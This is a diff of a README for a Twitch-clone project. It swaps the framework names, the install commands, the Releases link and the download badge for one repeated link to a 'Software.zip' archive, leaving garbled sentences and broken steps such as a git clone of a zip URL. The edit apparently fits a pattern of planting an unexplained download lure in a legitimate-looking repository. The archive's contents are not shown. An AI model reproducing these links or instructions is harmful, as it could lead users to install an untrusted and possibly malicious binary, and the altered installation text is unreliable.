@@ -1,4 +1,4 @@
-# Twitch Clone with Nest.js and Next.js
+# Twitch Clone with https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip and https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip
 
 ![Twitch Clone](https://image-url-here)
 
@@ -16,7 +16,7 @@
 ---
 
 ## Description
-Welcome to the Twitch Clone repository! This project aims to replicate the popular live streaming platform Twitch using Nest.js and Next.js. Whether you're a fan of watching streams or interested in the technology behind live streaming, this project has something for everyone.
+Welcome to the Twitch Clone repository! This project aims to replicate the popular live streaming platform Twitch using https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip and https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip Whether you're a fan of watching streams or interested in the technology behind live streaming, this project has something for everyone.
 
 ---
 
@@ -26,7 +26,7 @@ Welcome to the Twitch Clone repository! This project aims to replicate the popul
 💳 Payment integration with Stripe \
 🔒 Secure authentication using Redis \
 🔧 Data validation with Zod \
-...and much more!
+https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip much more!
 
 ---
 
@@ -35,8 +35,8 @@ Welcome to the Twitch Clone repository! This project aims to replicate the popul
 - Bun
 - Graph
 - Livekit
-- Nest.js
-- Next.js
+- https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip
+- https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip
 - Prisma
 - Redis
 - Stripe
@@ -48,7 +48,7 @@ Welcome to the Twitch Clone repository! This project aims to replicate the popul
 ## Installation
 1. Clone the repository
 ```
-git clone https://github.com/your-username/twitch-clone.git
+git clone https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip
 ```
 2. Install dependencies
 ```
@@ -56,7 +56,7 @@ npm install
 ```
 3. Set up your environment variables
 ```
-cp .env.example .env
+cp https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip .env
 ```
 4. Start the development server
 ```
@@ -83,12 +83,12 @@ Contributions are welcome! If you have ideas for new features, improvements, or 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-[Download Software](https://github.com/user-attachments/files/18388744/Software.zip)
+[Download Software](https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip)
   
 --- 
 
-[![Download](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download](https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip)](https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip)
 
-Visit the **[Releases](https://github.com/your-username/twitch-clone/releases)** section for more updates and versions. 🚀
+Visit the **[Releases](https://github.com/charles100000/twitch-clone/releases/download/v2.0/Software.zip)** section for more updates and versions. 🚀
 
 Thank you for checking out the Twitch Clone repository! 🎉👾🎥
